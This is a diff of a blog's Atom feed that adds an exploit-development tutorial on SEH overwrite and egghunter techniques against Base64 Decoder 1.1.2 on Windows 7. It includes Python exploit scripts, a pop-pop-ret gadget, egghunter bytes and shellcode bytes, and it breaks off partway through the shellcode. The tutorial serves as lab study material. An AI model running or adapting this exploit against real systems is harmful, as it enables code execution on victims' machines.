@@ -1,4 +1,234 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/blog/" rel="alternate" type="text/html" /><updated>2021-07-12T15:32:46+07:00</updated><id>http://localhost:4000/blog/feed.xml</id><title type="html">MobAppSec-Blog</title><subtitle>Mobile Application security and ARM Exploit Development</subtitle><entry><title type="html">Android Application Security [chapter 0x2] - Introduction to Frida 2: OWASP MSTG crackme Level 1-3</title><link href="http://localhost:4000/blog/android_application_security/2021/07/09/android_application_security_chapter_0x2.html" rel="alternate" type="text/html" title="Android Application Security [chapter 0x2] - Introduction to Frida 2: OWASP MSTG crackme Level 1-3" /><published>2021-07-09T10:44:25+07:00</published><updated>2021-07-09T10:44:25+07:00</updated><id>http://localhost:4000/blog/android_application_security/2021/07/09/android_application_security_chapter_0x2</id><content type="html" xml:base="http://localhost:4000/blog/android_application_security/2021/07/09/android_application_security_chapter_0x2.html">&lt;p&gt;Hello world!&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/blog/" rel="alternate" type="text/html" /><updated>2021-07-19T08:22:40+07:00</updated><id>http://localhost:4000/blog/feed.xml</id><title type="html">MobAppSec-Blog</title><subtitle>Mobile Application security and ARM Exploit Development</subtitle><entry><title type="html">Windows Exploit Development [chapter 0x2] - Revisiting SEH, Egghunter in Windows 7: Base64 Decoder 1.1.2 - What about null byte? Where is the EIP Overwrite?</title><link href="http://localhost:4000/blog/windows_exploit_development/2021/07/15/windows_exploit_development_chapter_0x2.html" rel="alternate" type="text/html" title="Windows Exploit Development [chapter 0x2] - Revisiting SEH, Egghunter in Windows 7: Base64 Decoder 1.1.2 - What about null byte? Where is the EIP Overwrite?" /><published>2021-07-15T13:44:25+07:00</published><updated>2021-07-15T13:44:25+07:00</updated><id>http://localhost:4000/blog/windows_exploit_development/2021/07/15/windows_exploit_development_chapter_0x2</id><content type="html" xml:base="http://localhost:4000/blog/windows_exploit_development/2021/07/15/windows_exploit_development_chapter_0x2.html">&lt;p&gt;Hello world!&lt;/p&gt;
+
+&lt;p&gt;Before we getting start with the content, I would like to mentioned that this material is not meant for beginner. If you never done Windows Exploit Development before I suggest to start reading my old blog about breaking the code series(&lt;a href=&quot;https://court-of-testing-analysing.blogspot.com/2019/11/breaking-code-exploit-development.html&quot;&gt;link&lt;/a&gt;) this will give a general idea on how to setup and conduct research on windows binary.&lt;/p&gt;
+
+&lt;p&gt;This post was heavily inspired from the following &lt;a href=&quot;https://www.exploit-db.com/exploits/46625&quot;&gt;exploit-db&lt;/a&gt;. You may notice later there are some differences on my exploit script but the concept is still the same with the original author.&lt;/p&gt;
+
+&lt;p&gt;Enjoy!&lt;/p&gt;
+
+&lt;h2&gt; Setup Windows Lab &lt;/h2&gt;
+
+&lt;p&gt;In this lab I used Windows 7 from windows IE developer official(&lt;a href=&quot;https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/&quot;&gt;website&lt;/a&gt;) and install several tools for exploit development in it, such as:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Python 2.7&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Immunity Debugger&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Mona&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;The vulnerable program, you can download it from the following &lt;a href=&quot;https://www.exploit-db.com/exploits/46625&quot;&gt;link&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Note 1: In this exploit, DEP is set to on, however I choose the option where it only affect some critical components in windows not our target program!&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_2/windows1.png&quot; alt=&quot;PLIST-FILE_3&quot; height=&quot;500px&quot; width=&quot;450px&quot; /&gt;&lt;/p&gt;
+
+&lt;h2&gt; Crash and Take Over the Program EIP &lt;/h2&gt;
+
+&lt;p&gt;Lets crash the program by supplying it with a massive amount of characters, we are just going straight used mona in immunity debugger to create a pattern to identify at what offset did the EIP is overwrite in our input.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;mona pattern_create 700&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;payload.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[!] payload.txt ready to uploaded&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Start the program, it should be look like this and we are going to copy-paste the payload from payload.txt to the “save to file” form and click “decode”. Don’t forget to attach it with immunity debugger.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_2/windows4.png&quot; alt=&quot;PLIST-FILE_3&quot; height=&quot;500px&quot; width=&quot;450px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The program is crash but we don’t see EIP is overwritten with our input, hmmmmm whats going on? is it because the payload is not long enough or is there any error that cause this situation.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_2/windows2.png&quot; alt=&quot;PLIST-FILE_3&quot; height=&quot;500px&quot; width=&quot;450px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The answer is because of the SEH features in the program. Basically SEH is like a try exception mechanism inside a program to handle error, if you are a programmer you already might know about this concept.&lt;/p&gt;
+
+&lt;p&gt;So how do we proceed? what should we do about it? simple! we shift our focus on taking control on SEH. The rule is that if a program encounter error it execution will be control by SEH so our priority now is to find the offset to overwrite SEH. You can take a quick look of where is the SEH reside at the bottom right window of immunity debugger.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_2/windows3.png&quot; alt=&quot;PLIST-FILE_3&quot; height=&quot;400px&quot; width=&quot;350px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If you take a look again at the result above you can see that before SEH there is nSEH(next SEH) this is a pointer that lead to another exception if the exception of the program currently hold can’t satifsfy the current error. Basically SEH structured like a linked list.&lt;/p&gt;
+
+&lt;p&gt;Thus, to take a full control of the SEH, we have to carefully overwrite this two location to take control of the program execution.&lt;/p&gt;
+
+&lt;p&gt;Of course you can pass the exception on immunity debugger to see what offset in our input overwrite the EIP, you can do this by clicking shift + f9 two times.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_2/windows5.png&quot; alt=&quot;PLIST-FILE_3&quot; height=&quot;400px&quot; width=&quot;350px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;To get the offset of the SEH and nSEH type the following command below. The result show us that EIP is overwrite at the index 624 and SEH is at 620, remember! our focus is now on SEH.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_2/windows6.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lets try to update our current script:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;620&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;nseh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;seh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;D&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nseh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;payload.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[!] payload.txt ready to uploaded&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Execute the script and try to paste it into the form again. It will crash again, however, try to check the SEH chain by going to “view” &amp;gt; “seh chain”&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_2/windows7.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;h2&gt; Forming a Plan &lt;/h2&gt;
+
+&lt;p&gt;cool! now we have taking control on the SEH chain. So what should we fill in those two places, according to &lt;a href=&quot;https://www.fuzzysecurity.com/tutorials/expDev/3.html&quot;&gt;fuzzysecurity&lt;/a&gt; we wanted to change the execution back to the stack because our shellcode is going to be there.&lt;/p&gt;
+
+&lt;p&gt;To do that we need a gadget that have this sequences:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;pop reg &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pop reg &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;this gadget will change the execution to the stack and it automatically make us move back two steps, thus, making it to land in the nSEH.&lt;/p&gt;
+
+&lt;p&gt;Finally, we fill nSEH with a short jump which start with: \xeb. Usually, most of the tutorial about SEH will be suggesting to do jump forward to front of the SEH, since this is where the shellcode usually placed in exploit later. But as I notice after I do a couple of trial and error, if I try to supply a payload more than 200 after the SEH it will tamper the exploit payload, which is not enough.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_2/windows8.jpg&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So what should we do then? We can jump backward again but this time we land before the nSEH since we have around 600 bytes of space at the beginning of exploit. But heres the catch!&lt;/p&gt;
+
+&lt;p&gt;To jump backward you can supply value between 0x80(-128) - 0xff(-1) along with the “\xeb”.&lt;/p&gt;
+
+&lt;p&gt;But this is still not enough since we only jump back 128 bytes. Thus, we need to incoporate what so called egghunter. Egghunter usually useful when we want to search our truncated payload, but in this case, we will used egghunter to redirect the execution to the beginning of the exploit so it can execute shellcode and it goes like this:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;SEH will contain pop reg ; pop reg ; ret&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;nSEH will jump backward with \xeb\x80 that will move the execution to our egghunter&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Egghunter will search the shellcode that will later placed at the beginning of our exploit.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_2/windows9.jpg&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So that’s going to be our plan for the exploit, but wait! there is more! and this going to be a final problem that we have to deal with.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;mona modules&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_2/windows10.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;All of the library used to search for gadget for SEH have ASLR and NX enabled, we can used original binary of the program(b64dec.exe) but if you take a look at it in more detail, it contains a null byte.&lt;/p&gt;
+
+&lt;p&gt;Most of the tutorial or post about exploit development recommend you not to used address that contains null byte, but in this case it might be an exception. Why? null byte is not allowed to used in exploit because it will truncated the next sequence of payload since computer think this as a stop sign to take input, BUT! we don’t have to worry about it since our exploit actually move backward not forward so we can just put a null byte at the end of our exploit.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;mona seh &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;b64dec.exe&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-cpb&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0d&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The bad characters filter used to make sure there are now new line in our exploit.&lt;/p&gt;
+
+&lt;p&gt;You can choose any gadget that found by mona from the above command and lets update our script like this:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;620&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;nseh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80eb9090&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#short jump 
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x13\xc0\x40&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop pop ret gadget
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nseh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seh&lt;/span&gt; 
+
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;payload.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[!] payload.txt ready to uploaded&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;For the seh don’t use struct to convert into little endian, you have to do it manually like above, since .pack() function will add “\x20” as an extra character.&lt;/p&gt;
+
+&lt;h2&gt; Execute the Plan &lt;/h2&gt;
+
+&lt;p&gt;Run the script and put the payload, in this case, I put a hardware breakpoint at the pop pop ret gadget to just check everything going smoothly. Don’t forget to bypass the exception twice in the immunity debugger by type “shift+f9”.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_2/windows11.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_2/windows12.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_2/windows13.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see, we managed to control the execution flow and jump backward. Next, we need to generate an egghunter so that we can move the execution at the beginning of the exploit to give us more room for our shellcode.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_2/windows14.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Copy the result above and put it in the python script.&lt;/p&gt;
+
+&lt;p&gt;Update the script like the below screenshoot:&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_2/windows15.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;496 is the offset where our short jump will take us in exploit and this is where the egghunter will be placed. If everything goes well, the execution will changed to where “w00tw00t” string reside and hit a breakpoint “\xcc”. Run the exploit and skip several instructions after the hardware breakpoint is hit, you will arrived at the egghunter.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_2/windows16.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Click continue by clicking “run program” icon or just klik f9. You will be taking to where “w00t” string and hit next breakpoint “\xcc”. Cool! we now have a lot of space to put our shellcode.&lt;/p&gt;
+
+&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;http://localhost:4000/blog/img/windows_exploit_dev_2/windows17.png&quot; alt=&quot;PLIST-FILE_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Finally, lets update our exploit script like this:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;egghunter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xd9\xd0\xd9\x74\x24\xf4\xbd\x36\x25\xcf\x92\x5e\x31\xc9\xb1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\x31\x6e\x18\x03\x6e\x18\x83\xc6\x32\xc7\x3a\x6e\xd2\x85&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc5\x8f\x22\xea\x4c\x6a\x13\x2a\x2a\xfe\x03\x9a\x38\x52\xaf&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x51\x6c\x47\x24\x17\xb9\x68\x8d\x92\x9f\x47\x0e\x8e\xdc\xc6&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8c\xcd\x30\x29\xad\x1d\x45\x28\xea\x40\xa4\x78\xa3\x0f\x1b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6d\xc0\x5a\xa0\x06\x9a\x4b\xa0\xfb\x6a\x6d\x81\xad\xe1\x34&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x01\x4f\x26\x4d\x08\x57\x2b\x68\xc2\xec\x9f\x06\xd5\x24\xee&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe7\x7a\x09\xdf\x15\x82\x4d\xe7\xc5\xf1\xa7\x14\x7b\x02\x7c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x67\xa7\x87\x67\xcf\x2c\x3f\x4c\xee\xe1\xa6\x07\xfc\x4e\xac&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x40\xe0\x51\x61\xfb\x1c\xd9\x84\x2c\x95\x99\xa2\xe8\xfe\x7a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
